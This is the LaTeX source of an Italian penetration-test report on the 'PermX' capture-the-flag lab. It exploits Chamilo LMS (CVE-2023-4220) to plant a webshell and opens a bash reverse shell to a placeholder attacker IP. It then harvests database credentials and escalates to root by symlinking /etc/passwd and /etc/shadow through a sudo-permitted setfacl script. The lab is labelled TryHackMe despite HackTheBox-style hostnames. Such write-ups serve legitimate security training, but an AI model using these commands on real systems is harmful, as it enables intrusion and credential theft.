\documentclass[a4paper,11pt]{article}

% -------------------- PACKAGES --------------------
\usepackage[margin=2.5cm]{geometry}
\usepackage{hyperref}
\usepackage{listings}
\usepackage{xcolor}
\usepackage{setspace}
\usepackage{titlesec}

% -------------------- CONFIG --------------------
\onehalfspacing

\hypersetup{
    colorlinks=true,
    linkcolor=black,
    urlcolor=blue
}

\titleformat{\section}{\large\bfseries}{\thesection}{1em}{}
\titleformat{\subsection}{\normalsize\bfseries}{\thesubsection}{1em}{}

\lstset{
    basicstyle=\ttfamily\small,
    breaklines=true,
    frame=single,
    backgroundcolor=\color{gray!10}
}

\title{\textbf{Penetration Test Report (OSCP Style)}\\PermX}
\author{Franco Salvucci}
\date{}

% -------------------- DOCUMENT --------------------
\begin{document}

\maketitle
\tableofcontents
\newpage

% --------------------------------------------------
\section{Informazioni sul Target}

\begin{itemize}
    \item \textbf{Indirizzo IP:} 10.10.11.23
    \item \textbf{Ambiente:} Laboratorio (TryHackMe)
\end{itemize}

% --------------------------------------------------
\section{Enumerazione}

\subsection{Scansione delle porte}

Come primo passo è stata effettuata una scansione delle porte per identificare i servizi esposti.

\begin{lstlisting}
nmap -sC -sV 10.10.11.23
\end{lstlisting}

La scansione ha evidenziato le seguenti porte aperte:

\begin{itemize}
    \item 22/tcp – SSH
    \item 80/tcp – HTTP
\end{itemize}

\subsection{Enumerazione Web}

Accedendo al servizio HTTP si presenta una web application.  
Si procede quindi con brute forcing delle directory:

\begin{lstlisting}
gobuster dir -u http://permx.htb \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
\end{lstlisting}

Non emergono risultati particolarmente utili, pertanto si passa all'enumerazione dei virtual host:

\begin{lstlisting}
ffuf -u http://permx.htb \
-H "Host: FUZZ.permx.htb" \
-w /usr/share/wordlists/amass/subdomains-top1mil-110000.txt -fw 18
\end{lstlisting}

Viene individuato il seguente vhost:

\begin{itemize}
    \item lms.permx.htb
\end{itemize}

% --------------------------------------------------
\section{Accesso Iniziale}

\subsection{Identificazione dell'applicazione}

Navigando sul vhost scoperto, si osserva una pagina di login.  
Analizzando la directory \texttt{/documentation} è possibile identificare il CMS utilizzato: \textbf{Chamilo LMS}.

\subsection{Sfruttamento della vulnerabilità}

La versione individuata risulta vulnerabile alla CVE-2023-4220, che consente Remote Code Execution tramite upload di file arbitrari.

È stato utilizzato un exploit pubblico per caricare una webshell.

Percorso della webshell:

\begin{lstlisting}
http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/shell.php
\end{lstlisting}

% --------------------------------------------------
\subsection{Ottenimento della Reverse Shell}

Per ottenere una shell interattiva è stato caricato uno script bash:

\begin{lstlisting}
#!/bin/bash
bash -i >& /dev/tcp/<ATTACKER_IP>/<PORTA> 0>&1
\end{lstlisting}

Listener lato attaccante:

\begin{lstlisting}
nc -lvnp 4444
\end{lstlisting}

Una volta eseguito il payload, si ottiene accesso come utente \texttt{www-data}.

% --------------------------------------------------
\section{Post-Exploitation}

\subsection{Ricerca credenziali}

Si procede con l'enumerazione del filesystem alla ricerca di file di configurazione:

\begin{lstlisting}
find /var/www/chamilo -name configuration*
\end{lstlisting}

Nel file principale vengono trovate credenziali del database in chiaro.

\subsection{Accesso via SSH}

Dalle directory home emerge l'utente \texttt{mtz}.  
Provando le credenziali ottenute, si riesce ad accedere via SSH:

\begin{lstlisting}
ssh mtz@10.10.11.23
\end{lstlisting}

Accesso riuscito.

% --------------------------------------------------
\section{Privilege Escalation}

\subsection{Verifica privilegi sudo}

\begin{lstlisting}
sudo -l
\end{lstlisting}

Output:

\begin{lstlisting}
/opt/acl.sh
\end{lstlisting}

Lo script può essere eseguito con privilegi elevati.

\subsection{Sfruttamento}

Lo script utilizza \texttt{setfacl}, consentendo la modifica dei permessi su file arbitrari.

Si creano link simbolici ai file sensibili:

\begin{lstlisting}
ln -s /etc/passwd passwd_link
ln -s /etc/shadow shadow_link
\end{lstlisting}

Utilizzando lo script, si ottiene accesso in scrittura.

A questo punto è possibile creare un nuovo utente con privilegi root ed effettuare il login:

\begin{lstlisting}
su nuovo_root
\end{lstlisting}

\textbf{Accesso root ottenuto.}

% --------------------------------------------------
\section{Proof of Compromise}

\subsection{User Flag}

\begin{lstlisting}
/home/mtz/user.txt
\end{lstlisting}

\subsection{Root Flag}

\begin{lstlisting}
/root/root.txt
\end{lstlisting}

% --------------------------------------------------
\section{Conclusioni}

Il sistema è stato compromesso con successo attraverso una catena di vulnerabilità:

\begin{itemize}
    \item Vulnerabilità RCE su applicazione web
    \item Esposizione di credenziali
    \item Errata configurazione dei privilegi sudo
\end{itemize}

L'attacco richiede competenze tecniche moderate e può essere replicato con strumenti standard.

\end{document}